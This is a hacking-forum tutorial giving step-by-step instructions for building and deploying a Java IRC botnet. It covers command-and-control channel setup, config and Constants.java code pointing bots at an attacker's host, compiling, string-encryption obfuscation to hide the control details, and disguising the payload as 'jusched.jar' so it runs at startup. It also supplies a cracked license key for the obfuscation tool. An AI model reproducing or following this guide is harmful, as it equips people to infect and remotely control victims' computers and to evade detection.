    Well, To that kid who accused me of ripping my old tutorial. Go google "Java botnet" You will find about 30 of MY tutorial.

    Any way, The tutorial was written in a matter of minutes so i'm going to help you properly here.

    Made by dj mint off hackforums.

    Ok, First off you need an IRC channel (Two helps!) and you need to have java JDK installed on your computer. Now this usually comes with most computers now.

    1) If you don't have java download it here
    Code
    http://java.sun.com/javase/downloads/index.jsp
    It's the very first one, You really can't miss it.

    2) Ok, So now we have java installed. Next we are going to need the botnet source (SCR) Now this one i use i can't remember who made it but credit goes to him/her.
    Code
    http://www.#/?d=BLA2ST3U
    I re-uploaded it under my name so no one can call me a ripper. (changed the link because i forgot to delete the class files in there)

    3) Ok, So now you have the source and you should of unpacked it. You should have all these files which you have no clue what are. They should all be file like "something.java" You open these files in notepad or wordpad. First off were going to edit the config.php This is not a java file.

    4) Ok, The config.php looks as follows.
    Code
    SERVER: IRCSERVERHERE</br>PORT: IRCPORTHERE</br>IN_CHANNEL: #channlename1</br>OUT_CHANNEL: #channlename2</br>IN_PASSWORD: putanythinghere </br>OUT_PASSWORD: putanythinghere </br>NICK: [L0L]</br>CONTROLLERS: Owner1,owner2,owner3,owner4</br>

    For the people who still don't understand that. SERVER you put the IRC Server. (irc.domain.com or what ever) The PORT you put the IRC port. IN_CHANNEL is the channel you control the bots on like give commands. OUT_CHANNEL is the channel the bots will answer. So if i did .getip in channel1 they would respond on channel2 with there ip's. The password is the IRC channel password. If you don't have one set just put it as lol or some thing or the bots don't connect at all. The Controllers are the people which control the botnet. You can add as many as you want. Make sure there separated by a ","

    5) Got that filled out? Not that hard was it? Now you need to upload that to a host. Now this bit confuses people. By this i don't mean #. A site like www.mysite.com/config.php A site where you can view the php page. Just google free hosts or even use freewebs.

    6) Ok now were going to edit Constants.java I'll break this down too.
    Code
        public static final double BOT_VERSION = 2.3;

        public static final String MAIN_HOST = "IRCHOSTHERE";

        public static final String CONF_URL = "www.mysite.com/config.php";

        public static final String BACKUP_HOST = "";

        public static final String CONF_URL_BACKUP = "";

        public static final String IP_ADDR_URL = "http://whatismyip.com/automation/n09230945.asp";

        public static final int FILE_SERVER_DEFAULT_PORT = 3943;

        public static final String INI_FILE_LOC = "C:\\Program Files\\win32.ini";
        
        public static final String PASSWORD = "lol";

    MAIN_HOST = The IRC host
    CONF_URL = The Config file you uploaded to your site on the last step
    BACKUP_HOST = If your IRC ever went down you make the bots join another one.
    CONF_URL_BACKUP = Backup for the config file.
    IP_ADDR_URL = Don't touch it.
    FILE_SERVER_DEFAULT_PORT = Don't touch it.
    INI_FILE_LOC = Again don't touch it.
    PASSWORD = The password you put in the config file. Mines always lol.

    6) Ok, Saved that? Yeaaay your almost there! Now we need to compile the botnet. To do this i have included a file called compile.bat, Now you should be able to just double click it and it should pop up and saying compiling then close on you. Then if you look back at the folder you will have loads of .class files.

    Ignore this if the compiler worked for you
    If you get the "javac" _error_" Right click compile.bat and click edit. It looks like this

    Code
    @echo off
    color 0b
    title SERVER NAME Compiler
    @echo ----------------------
    @echo --Initiating Compile--
    @echo ----------------------
    "C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe" -cp . *.java
    @echo ----------------------
    @echo --Compiling complete--
    @echo ----------------------
    @echo off
    title SERVER NAME server
    "C:\Program Files\Java\jre6\bin\java.exe" -Xmx500m server

    The bit you want to edit is
    Code
    "C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe" -cp . *.java

    The "jdk.1.6.0_14" One of the reasons you could be getting javac _error_ (This is the most common any way) Go find your way to your java folder and see what version you have and change the version number as needed. Save the file and run again.

    7) Ok now we have lots of new files. Now personally i get all the new files (.class) and put them into a folder called built. This will help trust me. Ok, Now were going to open jshrink.jar (This is NOT a botnet but some thing we use to compile the botnet)

    Click the license tab. If there isn't a code in there put

    Code
    31-12-2099 CANCQJUQKEOQKKLI

    Now leave it up and go into the "Built" folder you made earlier with all the .class files in. Select them all and drag them onto the white part of jshrink. Now go into the options tab and check "String encryption" Make it harder for people to get your IRC information.

    Ok now click File > save as navigate to where you want to save the botnet to and call it jusched.jar. wohohohohoh you have a botnet.

    8) Now to test if this thing works. Run it. You should get a bot joining your IRC channels. (In and the out) To remove the botnet follow the steps below

    Start>Run>msconfig>Click startup tab>Uncheck jusched

    Sorted. For commands on the botnet do .commands in the IN channel and look at the OUT channel

    Need any help please PM me :)
